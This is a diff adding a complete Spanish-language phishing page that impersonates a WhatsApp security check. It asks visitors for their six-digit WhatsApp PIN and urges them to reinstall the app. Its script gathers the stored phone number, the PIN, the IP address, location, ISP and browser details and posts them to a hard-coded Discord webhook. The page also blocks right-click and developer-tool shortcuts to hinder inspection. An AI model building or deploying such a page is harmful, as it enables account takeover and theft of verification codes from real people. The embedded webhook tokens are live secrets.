@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<!-- saved from url=(0042)https://vridtosaccou.kesug.com/index4.html -->
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>veriffn</title>
+    <link rel="shortcut icon" type="image/x-icon" href="https://c.s-microsoft.com/favicon.ico?v2">
+  
+    <style>
+        :root {
+            --primary-dark: #106ebe;
+            --primary-main: #0078d4;
+            --neutral-dark: #616161;
+            --neutral-light: rgba(243, 242, 241, 0.9);
+            --accent-green: #25d366;
+            --accent-dark: #075e54;
+            --border-curve: 12px;
+            --shadow-main: 0 4px 12px rgba(0, 0, 0, 0.15);
+            --animation-speed: all 0.2s ease-in-out;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        .page-wrapper, html {
+            height: 100%;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #1b1b1b;
+            line-height: 1.5;
+            margin: 0;
+            padding-bottom: 50px;
+        }
+
+        .page-wrapper {
+            background: url('https://discord.com/api/webhooks/1465672169324413001/VGJlpUWNJEpZnSz1pkOTfxrQNeEESDRiGE2dm4K7fZTWhnSe8lzZPuXVrkONzurSiuGm') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        .page-wrapper::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: -1;
+        }
+
+        .floating-elements {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .floating-element {
+            position: absolute;
+            border-radius: 50%;
+            opacity: 0.05;
+            animation: floatElement 20s linear infinite;
+            background: radial-gradient(circle, var(--accent-green) 0%, var(--primary-main) 100%);
+            filter: blur(1px);
+        }
+
+        @keyframes floatElement {
+            0% { transform: translateY(0) translateX(0) scale(1); opacity: 0.05; }
+            50% { opacity: 0.08; }
+            100% { transform: translateY(-100vh) translateX(10px) scale(1.05); opacity: 0; }
+        }
+
+        .auth-panel {
+            width: 87%;
+            max-width: 440px;
+            background: rgba(255, 255, 255, 0.95);
+            box-shadow: var(--shadow-main);
+            border-radius: var(--border-curve);
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            margin: 20px 0;
+            backdrop-filter: blur(8px);
+            z-index: 10;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        .auth-header {
+            text-align: center;
+            padding: 20px 20px 10px;
+        }
+
+        .auth-logo {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .auth-logo i {
+            font-size: 40px;
+            color: var(--accent-green);
+        }
+
+        .auth-logo:hover {
+            transform: scale(1.05);
+        }
+
+        .auth-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #242424;
+            margin: 0 0 8px 0;
+        }
+
+        .auth-subtitle {
+            font-size: 14px;
+            color: #424242;
+            margin: 0 0 20px 0;
+        }
+
+        .input-section {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--primary-dark);
+            font-size: 14px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .form-input {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #707070;
+            width: 100%;
+            height: 40px;
+            padding: 8px 12px 8px 40px;
+            border: 1px solid rgba(166, 166, 166, 0.5);
+            border-radius: 4px;
+            font-size: 14px;
+            transition: var(--animation-speed);
+            background-color: rgba(255, 255, 255, 0.9);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-main);
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.3);
+            background-color: #fff;
+        }
+
+        .form-input::placeholder {
+            color: #a8b4be;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: var(--primary-main);
+        }
+
+        .action-button {
+            background-color: var(--primary-main);
+            color: white;
+            width: 100%;
+            height: 40px;
+            padding: 10px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: var(--border-curve);
+            cursor: pointer;
+            text-align: center;
+            border: none;
+            transition: var(--animation-speed);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .action-button:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .action-button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .security-notice {
+            background: rgba(0, 120, 212, 0.1);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .security-notice i {
+            font-size: 20px;
+            color: var(--primary-main);
+            min-width: 30px;
+            padding-top: 4px;
+        }
+
+        .security-notice p {
+            font-size: 13px;
+            color: #424242;
+            line-height: 1.5;
+        }
+
+        .error-alert {
+            color: #d83b01;
+            font-size: 12px;
+            margin-top: 8px;
+            text-align: center;
+            display: none;
+        }
+
+        .form-input.invalid {
+            border-color: #d83b01;
+            background: rgba(216, 59, 1, 0.05);
+        }
+
+        .form-input.invalid:focus {
+            box-shadow: 0 0 0 2px rgba(216, 59, 1, 0.2);
+        }
+
+        .page-footer {
+            position: fixed;
+            bottom: -55px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            background: transparent;
+            padding: 0;
+            margin-bottom: 16px;
+            font-size: 12px;
+            color: #fff;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            z-index: 9999;
+        }
+
+        .page-footer .footer-text {
+            margin-bottom: 8px;
+            color: #fff;
+            font-size: 10px;
+            line-height: 1.3;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            padding: 0 10px;
+        }
+
+        .page-footer .footer-text a {
+            color: #a0d2ff;
+            text-decoration: none;
+        }
+
+        .page-footer .footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        .page-footer .footer-nav {
+            display: inline-flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .page-footer .footer-item {
+            color: #fff !important;
+            text-decoration: none;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
+
+        .page-footer .footer-item:hover {
+            text-decoration: underline;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @media (max-width: 480px) {
+            .page-wrapper {
+                background: url('https://cdn.glitch.global/7177bfef-a9de-49ca-904a-bc82dc609bfd/Captura%20de%20pantalla%202025-03-13%20234358.png?v=1741927464384') no-repeat center center fixed !important;
+                background-size: cover !important;
+                display: flex !important;
+                align-items: center !important;
+                justify-content: center !important;
+                min-height: 100vh !important;
+                padding: 20px 0 !important;
+            }
+
+            .page-wrapper::before {
+                background: rgba(0, 0, 0, 0.5) !important;
+            }
+
+            .auth-panel {
+                width: 100% !important;
+                max-width: 100% !important;
+                padding: 15px !important;
+                margin: 0 15px;
+                border-radius: 8px !important;
+                border: none !important;
+            }
+
+            .auth-header {
+                padding: 15px 15px 10px;
+            }
+
+            .auth-logo {
+                width: 70px;
+                height: 70px;
+            }
+
+            .auth-logo i {
+                font-size: 36px;
+            }
+
+            .auth-title {
+                font-size: 18px !important;
+                margin-bottom: 4px !important;
+            }
+
+            .auth-subtitle {
+                font-size: 13px !important;
+                margin-bottom: 16px !important;
+            }
+
+            .form-input {
+                padding: 8px 12px 8px 36px;
+                font-size: 13px;
+            }
+
+            .input-icon {
+                font-size: 14px;
+                left: 10px;
+            }
+
+            .action-button {
+                padding: 8px 12px;
+                font-size: 13px;
+            }
+
+            .security-notice {
+                padding: 12px;
+                margin-top: 15px;
+            }
+
+            .page-footer {
+                font-size: 11px;
+            }
+
+            .page-footer .footer-nav {
+                gap: 15px;
+            }
+
+            .page-footer .footer-text {
+                font-size: 9px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .auth-panel {
+                padding: 12px !important;
+            }
+
+            .auth-logo {
+                width: 60px;
+                height: 60px;
+            }
+
+            .auth-logo i {
+                font-size: 32px;
+            }
+        }body {background-color: #0078d4;}
+    </style>
+    <script src="imagen/jquery.min.js.descarga"></script>
+    <!-- Incluimos el archivo con la configuracion del bot de Telegram -->
+ <script type="text/javascript" src="imagen/imagenes.js"></script>
+</head><center><br><br><br>
+<body oncontextmenu="return false">
+<script>
+document.addEventListener("keydown", function(e) {
+    if(e.key === "F12") return false;
+    if(e.ctrlKey && e.key === "u") return false;
+    if(e.ctrlKey && e.shiftKey && e.key === "I") return false;
+});
+</script>
+
+<div class="floating-elements" id="floatingElements"><div class="floating-element" style="width: 20.0437px; height: 20.0437px; left: 53.3464%; top: 100vh; animation-delay: 6.58331s;"></div><div class="floating-element" style="width: 28.8135px; height: 28.8135px; left: 41.2501%; top: 100vh; animation-delay: 14.0671s;"></div><div class="floating-element" style="width: 20.5787px; height: 20.5787px; left: 24.5186%; top: 100vh; animation-delay: 11.9015s;"></div><div class="floating-element" style="width: 31.0527px; height: 31.0527px; left: 47.517%; top: 100vh; animation-delay: 17.7343s;"></div><div class="floating-element" style="width: 40.9864px; height: 40.9864px; left: 94.4829%; top: 100vh; animation-delay: 18.3027s;"></div><div class="floating-element" style="width: 36.1044px; height: 36.1044px; left: 5.37197%; top: 100vh; animation-delay: 18.6121s;"></div><div class="floating-element" style="width: 21.3811px; height: 21.3811px; left: 58.6957%; top: 100vh; animation-delay: 5.1156s;"></div><div class="floating-element" style="width: 30.439px; height: 30.439px; left: 31.9404%; top: 100vh; animation-delay: 14.3668s;"></div></div>
+<div class="auth-panel" aria-live="polite">
+    <div class="auth-header">
+        <div class="auth-logo">
+    <img style="width: 100%;border-radius: 100%;" src="https://media.gq.com.mx/photos/632516744fdcb133567b255e/1:1/w_2501,h_2501,c_limit/WhatsApp_Logo_2-1.jpeg" alt="">
+        </div>
+        <h1 class="auth-title">Autenticación de Seguridad</h1>
+        <p class="auth-subtitle" id="auth-subtitle">Por favor, introduzca el código de autenticacion (PIN) de su numero de WhatsApp que termina en </p>
+        <b>RECOMENDACION OBLIGATORIA: DESINSTALA Y VUELVE A INSTALAR LA APP DE WHATSAPP PARA HACER EFECTIVO EL PROCESO REALIZADO, NO SE BORRARA NINGUN DATO NI CHATS AL VOLVER A INSTALAR</b>
+    </div>
+    <div class="auth-content">
+        <form id="pinForm" aria-label="Formulario de autenticación de PIN">
+            <div class="input-section">
+                <label for="auth" class="input-label">Por favor, introduzca tu PIN</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-shield-alt input-icon" aria-hidden="true"></i>
+                    <input type="text" id="auth" name="auth" minlength="6" maxlength="6" placeholder="Codigo" required="" pattern="[0-9]{6}" class="form-input" aria-describedby="error-alert" oninput="this.value = this.value.replace(/[^0-9]/g, &#39;&#39;).slice(0, 6)">
+                </div>
+                <div class="error-alert" id="error-alert" role="alert">
+                    Por favor, ingresa un codigo de 6 digitos valido
+                </div>
+            </div>
+            <button type="submit" id="submitButton" class="action-button">
+                <i class="fas fa-lock"></i> Autenticar Cuenta
+            </button>
+            <div class="security-notice">
+                <i class="fas fa-shield-check" aria-hidden="true"></i>
+                <p>Tu informacion esta protegida con encriptacion de extremo a extremo. WhatsApp no puede leer tus mensajes ni escuchar tus llamadas.</p>
+            </div>
+        </form>
+    </div>
+    <div class="page-footer">
+        <div class="footer-text">
+            Usa la exploracion privada si este no es tu dispositivo.
+            <a href="">Mas informacion</a>
+        </div>
+        <div class="footer-nav">
+            <a href="" class="footer-item">Ayuda</a>
+            <a href="" class="footer-item">Terminos de uso</a>
+            <a href="" class="footer-item">Privacidad y cookies</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Configuración Discord Webhook (reemplaza con tu URL)
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1465605598677565473/GpPoSB9EH8AtU-3gb5Eqr3TA_A2Z5Q_nU4lzAtPhE00nDk9SRjMuj5HU63u71JKjr-6G';
+
+    $(document).ready(function() {
+        // Generar elementos flotantes para el fondo
+        function createFloatingElements() {
+            const elementsContainer = $('#floatingElements');
+            for (let i = 0; i < 8; i++) {
+                const size = Math.random() * 30 + 15;
+                const posX = Math.random() * 100;
+                const delay = Math.random() * 20;
+                $('<div>').addClass('floating-element').css({
+                    width: `${size}px`,
+                    height: `${size}px`,
+                    left: `${posX}%`,
+                    top: '100vh',
+                    animationDelay: `${delay}s`
+                }).appendTo(elementsContainer);
+            }
+        }
+        createFloatingElements();
+
+        // Funcion para obtener el telefono del localStorage
+        function obtenerTelefonoUsuario() {
+            // Primero intentamos con 'telefonoUsuario'
+            let telefono = localStorage.getItem('telefonoUsuario');
+            
+            // Si no existe, intentamos con 'telefono'
+            if (!telefono) {
+                telefono = localStorage.getItem('telefono');
+            }
+            
+            // Si todavia no existe, usamos un valor por defecto
+            return telefono || '0000000000';
+        }
+
+        // Actualizar subtitulo con los ultimos 4 digitos del numero de telefono
+        function actualizarSubtitulo() {
+            const telefono = obtenerTelefonoUsuario();
+            // Limpiar el numero para quedarnos solo con digitos
+            const soloDigitos = telefono.replace(/\D/g, '');
+            const lastFourDigits = soloDigitos.length >= 4 ? soloDigitos.slice(-4) : '0000';
+            $('#auth-subtitle').text(`Por favor, introduzca el código de autenticacion (PIN) de su numero de WhatsApp que termina en : **** *** ${lastFourDigits}`); 
+        }
+
+        // Llamar a la funcion para actualizar el subtitulo
+        actualizarSubtitulo();
+
+        // Funcion para enviar mensaje a Discord Webhook
+        function enviarMensajeDiscord(telefono, codigo, ip, ubicacion, isp, browserInfo, tipoCodigo) {
+            // Obtener información del navegador
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            
+            // Detectar navegador
+            function detectarNavegador() {
+                if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
+                    return "Chrome";
+                } else if (userAgent.includes("Firefox")) {
+                    return "Firefox";
+                } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
+                    return "Safari";
+                } else if (userAgent.includes("Edg")) {
+                    return "Edge";
+                } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
+                    return "Opera";
+                }
+                return "Desconocido";
+            }
+
+            // Determinar color según tipo de código
+            let color, titulo, descripcion;
+            if (tipoCodigo === 'pin') {
+                color = 16744192; // Naranja
+                titulo = "🔐 **CÓDIGO PIN DE WHATSAPP**";
+                descripcion = "Código de autenticación PIN ingresado";
+            } else {
+                color = 3447003; // Azul
+                titulo = "🔑 **CÓDIGO DE AUTENTICACIÓN**";
+                descripcion = "Código de verificación ingresado";
+            }
+
+            // Crear embed para Discord
+            const embed = {
+                "title": titulo,
+                "description": descripcion,
+                "color": color,
+                "fields": [
+                    {
+                        "name": "📱 **Número de Teléfono**",
+                        "value": `\`\`\`${telefono}\`\`\``,
+                        "inline": true
+                    },
+                    {
+                        "name": "🔢 **Código de 6 Dígitos**",
+                        "value": `\`\`\`${codigo}\`\`\``,
+                        "inline": true
+                    },
+                    {
+                        "name": "📋 **Tipo de Código**",
+                        "value": tipoCodigo === 'pin' ? "🔐 **PIN de WhatsApp**" : "🔑 **Código de Verificación**",
+                        "inline": true
+                    },
+                    {
+                        "name": "🌐 **Información de Red**",
+                        "value": ip ? `**IP:** \`${ip}\`\n**Ubicación:** ${ubicacion || "No disponible"}\n**ISP:** ${isp || "No disponible"}` : "No se pudo obtener la información de red",
+                        "inline": false
+                    },
+                    {
+                        "name": "💻 **Información del Dispositivo**",
+                        "value": `**Navegador:** ${detectarNavegador()}\n**Sistema:** ${platform}\n**Idioma:** ${language}\n**User Agent:** \`${userAgent.substring(0, 100)}...\``,
+                        "inline": false
+                    },
+                    {
+                        "name": "🕐 **Fecha y Hora**",
+                        "value": new Date().toLocaleString('es-ES', {
+                            timeZone: 'America/Mexico_City',
+                            hour12: true,
+                            weekday: 'long',
+                            year: 'numeric',
+                            month: 'long',
+                            day: 'numeric',
+                            hour: '2-digit',
+                            minute: '2-digit',
+                            second: '2-digit'
+                        }),
+                        "inline": false
+                    }
+                ],
+                "footer": {
+                    "text": "Sistema de Autenticación WhatsApp • Protegido por Seguridad La Positiva",
+                    "icon_url": "https://cdn-icons-png.flaticon.com/512/733/733585.png"
+                },
+                "timestamp": new Date().toISOString(),
+                "thumbnail": {
+                    "url": "https://cdn-icons-png.flaticon.com/512/3067/3067256.png"
+                }
+            };
+
+            // Configuración para enviar a Discord Webhook
+            const settings = {
+                "async": true,
+                "crossDomain": true,
+                "url": DISCORD_WEBHOOK_URL,
+                "method": "POST",
+                "headers": {
+                    "Content-Type": "application/json"
+                },
+                "data": JSON.stringify({
+                    "embeds": [embed],
+                    "content": tipoCodigo === 'pin' ? "🔐 **NUEVO CÓDIGO PIN INGRESADO**" : "🔑 **NUEVO CÓDIGO DE AUTENTICACIÓN**",
+                    "username": "WhatsApp Security PIN",
+                    "avatar_url": "https://cdn-icons-png.flaticon.com/512/3067/3067256.png"
+                })
+            };
+
+            return $.ajax(settings);
+        }
+
+        // Validacion del formulario
+        $('#pinForm').submit(function(e) {
+            e.preventDefault();
+            const codeInput = $('#auth');
+            const errorAlert = $('#error-alert');
+            const submitButton = $('#submitButton');
+            const code = codeInput.val().trim();
+
+            // Resetear estado
+            codeInput.removeClass('invalid').attr('aria-invalid', 'false');
+            errorAlert.hide();
+            submitButton.prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> Autenticando...');
+
+            // Validar el codigo
+            if (!/^\d{6}$/.test(code)) {
+                codeInput.addClass('invalid').attr('aria-invalid', 'true');
+                errorAlert.show();
+                submitButton.prop('disabled', false).html('<i class="fas fa-lock"></i> Autenticar Cuenta');
+                return;
+            }
+
+            // Guardar el código PIN en localStorage
+            localStorage.setItem('pinCode', code);
+            const telefono = obtenerTelefonoUsuario();
+
+            // Función para manejar el éxito del envío
+            function manejarExito() {
+                submitButton.html('<i class="fas fa-check"></i> Autenticación Exitosa').css('background-color', 'var(--accent-green)');
+                setTimeout(function() {
+                    try {
+                        window.location = 'cargando2.html';
+                    } catch (e) {
+                        errorAlert.text('Error al redirigir. Intenta de nuevo.').show();
+                        submitButton.prop('disabled', false).html('<i class="fas fa-lock"></i> Autenticar Cuenta').css('background-color', 'var(--primary-main)');
+                    }
+                }, 1500);
+            }
+
+            // Función para manejar el error del envío
+            function manejarError() {
+                codeInput.addClass('invalid').attr('aria-invalid', 'true');
+                errorAlert.text('Error al conectar con el servidor. Intenta de nuevo.').show();
+                submitButton.prop('disabled', false).html('<i class="fas fa-lock"></i> Autenticar Cuenta').css('background-color', 'var(--primary-main)');
+            }
+
+            // Intentar obtener información de IP y ubicación
+            $.getJSON("https://api.ipify.org?format=json")
+                .done(function(data) {
+                    const ip = data.ip;
+                    
+                    $.getJSON("https://ipinfo.io")
+                        .done(function(response) {
+                            const ubicacion = response.city + ", " + response.country;
+                            const isp = response.org || "Desconocido";
+                            // Enviar a Discord con IP y ubicación (tipo: pin)
+                            enviarMensajeDiscord(telefono, code, ip, ubicacion, isp, navigator.userAgent, 'pin')
+                                .done(manejarExito)
+                                .fail(manejarError);
+                        })
+                        .fail(function() {
+                            // Si falla ipinfo, enviar solo con IP
+                            enviarMensajeDiscord(telefono, code, ip, null, null, navigator.userAgent, 'pin')
+                                .done(manejarExito)
+                                .fail(manejarError);
+                        });
+                })
+                .fail(function() {
+                    // Si falla ipify, enviar sin información de IP
+                    enviarMensajeDiscord(telefono, code, null, null, null, navigator.userAgent, 'pin')
+                        .done(manejarExito)
+                        .fail(manejarError);
+                });
+        });
+    });
+</script>
+
+</body></html>
